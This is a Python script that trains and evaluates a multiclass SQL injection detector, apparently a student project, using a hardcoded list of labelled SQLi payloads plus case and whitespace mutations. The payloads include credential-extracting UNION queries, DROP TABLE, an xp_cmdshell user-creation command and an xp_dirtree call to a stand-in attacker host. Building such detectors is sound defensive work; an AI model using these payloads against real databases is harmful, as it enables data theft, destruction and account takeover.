import pandas as pd
import numpy as np
import joblib
from sklearn.model_selection import train_test_split
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline
from sklearn.metrics import classification_report, confusion_matrix, roc_auc_score
from sklearn.preprocessing import LabelEncoder


def augment_with_real_world_attacks(df, query_col='Query', label_col='Label'):
    real_world_samples = [
        ("' OR '1'='1", 'Boolean-based SQLi'),
        ("' OR '1'='1' --", 'Boolean-based SQLi'),
        ("admin'--", 'Boolean-based SQLi'),
        ("' OR 1=1--", 'Boolean-based SQLi'),
        ("1 AND 1=1", 'Boolean-based SQLi'),
        ("1 AND 1=2", 'Boolean-based SQLi'),
        ("1' AND '1'='1", 'Boolean-based SQLi'),
        ("1 AND SUBSTRING(username,1,1)='a'", 'Boolean-based SQLi'),
        ("'/**/OR/**/1=1--", 'Boolean-based SQLi'),
        ("' oR '1'='1'--", 'Boolean-based SQLi'),
        ("'\tOR\t'1'='1'--", 'Boolean-based SQLi'),
        ("''OR 1=1--", 'Boolean-based SQLi'),
        ("' UNION SELECT NULL--", 'Union-based SQLi'),
        ("' UNION SELECT NULL,NULL,NULL--", 'Union-based SQLi'),
        ("' UNION ALL SELECT NULL--", 'Union-based SQLi'),
        ("1 UNION SELECT username, password FROM users--", 'Union-based SQLi'),
        ("1' UNION SELECT table_name,NULL FROM information_schema.tables--", 'Union-based SQLi'),
        ("' UNION SELECT user(),version(),database()--", 'Union-based SQLi'),
        ("' uNiOn SeLeCt NULL--", 'Union-based SQLi'),
        ("/*!50000 UNION*//*!50000 SELECT*/NULL--", 'Union-based SQLi'),
        ("1; WAITFOR DELAY '0:0:5'--", 'Time-based SQLi'),
        ("1 AND SLEEP(5)", 'Time-based SQLi'),
        ("1' AND SLEEP(5)--", 'Time-based SQLi'),
        ("1; SELECT pg_sleep(5)--", 'Time-based SQLi'),
        ("1 OR SLEEP(5)=0 LIMIT 1--", 'Time-based SQLi'),
        ("1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 'Time-based SQLi'),
        ("1 AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT version())))--", 'Error-based SQLi'),
        ("1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--", 'Error-based SQLi'),
        ("1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1)--", 'Error-based SQLi'),
        ("1; SELECT 1/0--", 'Error-based SQLi'),
        ("1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", 'Error-based SQLi'),
        ("1; EXEC master..xp_dirtree '//attacker.com/a'--", 'Out-of-band SQLi'),
        ("1; EXEC xp_cmdshell('net user hacker Password1 /add')--", 'Out-of-band SQLi'),
        ("1; DROP TABLE users--", 'Out-of-band SQLi'),
        ("1; INSERT INTO users VALUES ('hacker','hacked')--", 'Out-of-band SQLi'),
        ("1; TRUNCATE TABLE logs--", 'Out-of-band SQLi'),
        ("SELECT * FROM orders WHERE status='pending'", 'Benign'),
        ("SELECT id, name FROM products WHERE category='electronics'", 'Benign'),
        ("SELECT COUNT(*) FROM users WHERE created_at > '2024-01-01'", 'Benign'),
        ("UPDATE profile SET bio='I love OR hate spiders' WHERE id=5", 'Benign'),
        ("SELECT * FROM logs WHERE message LIKE '%error%'", 'Benign'),
        ("SELECT sleep_hours FROM health_tracker WHERE user_id=42", 'Benign'),
        ("SELECT version FROM app_config LIMIT 1", 'Benign'),
        ("SELECT * FROM articles WHERE tag IN ('union','select','joins')", 'Benign'),
        ("SELECT body FROM emails WHERE subject LIKE '%OR%'", 'Benign'),
        ("SELECT * FROM code_snippets WHERE snippet LIKE '%SLEEP%'", 'Benign'),
    ]

    aug_df = pd.DataFrame(real_world_samples, columns=[query_col, label_col])

    mutated_rows = []
    rng = np.random.default_rng(seed=42)
    space_variants  = ['  ', '\t', '%20']
    case_transforms = [str.lower, str.upper, lambda s: s]

    for atk_label in [l for l in df[label_col].unique() if l != 'Benign']:
        for q in df[df[label_col] == atk_label][query_col].tolist():
            if rng.random() > 0.20:   # 20% sample — faster than 30%
                continue
            transform = rng.choice(case_transforms)
            mutations = []
            for kw in ['SELECT', 'UNION', 'SLEEP', 'WAITFOR', 'OR', 'AND']:
                if kw in q:
                    mutations.append(q.replace(kw, transform(kw), 1))
            if ' ' in q:
                mutations.append(q.replace(' ', rng.choice(space_variants), 1))
            for m in mutations[:2]:
                mutated_rows.append({query_col: m, label_col: atk_label})

    combined = pd.concat([df, aug_df, pd.DataFrame(mutated_rows)], ignore_index=True)
    combined = combined.sample(frac=1, random_state=42).reset_index(drop=True)
    print(f"[augment] original={len(df)}  curated={len(aug_df)}  "
          f"mutations={len(mutated_rows)}  total={len(combined)}")
    return combined


# ── Load & augment ───────────────────────────────────────────────────────────
df     = pd.read_csv(r'C:\Users\SOFTAGE\Desktop\is project\cleaneddataset.csv')
df_aug = augment_with_real_world_attacks(df)

le = LabelEncoder()
df_aug['Label_enc'] = le.fit_transform(df_aug['Label'])
print(f"Classes: {list(le.classes_)}\n")

X_train, X_test, y_train, y_test = train_test_split(
    df_aug['Query'], df_aug['Label_enc'],
    test_size=0.20, random_state=42, stratify=df_aug['Label_enc']
)

print("Training...")



model = Pipeline([
    ('tfidf', TfidfVectorizer(
        analyzer='char',
        ngram_range=(1, 4),
        min_df=3,
        use_idf=True,
        sublinear_tf=True,
        max_features=50_000,
    )),
    ('lr', LogisticRegression(
        max_iter=2000,
        C=1.0,
        class_weight='balanced',
        solver='lbfgs',
        n_jobs=-1,
    ))
])

model.fit(X_train, y_train)
print("Done.\n")

# ── Evaluate ─────────────────────────────────────────────────────────────────
y_pred = model.predict(X_test)

print("--- Classification Report ---")
print(classification_report(y_test, y_pred, target_names=le.classes_, digits=4))

print("--- Confusion Matrix ---")
cm = confusion_matrix(y_test, y_pred)
print(pd.DataFrame(cm, index=le.classes_, columns=le.classes_).to_string())

print("\n--- Per-class summary ---")
print(f"{'Class':<25} {'Correct':>8} {'Missed':>8}")
print("-" * 43)
for i, cls in enumerate(le.classes_):
    print(f"{cls:<25} {cm[i,i]:>8} {cm[i].sum()-cm[i,i]:>8}")

print(f"\nOverall accuracy : {(y_pred == y_test).mean():.4f}")
print(f"ROC-AUC (OvR)    : {roc_auc_score(y_test, model.predict_proba(X_test), multi_class='ovr', average='weighted'):.4f}")

# ── Save ─────────────────────────────────────────────────────────────────────
joblib.dump({'model': model, 'label_encoder': le}, 'sqli_multiclass_model.pkl')
print("\nSaved as 'sqli_multiclass_model.pkl'")


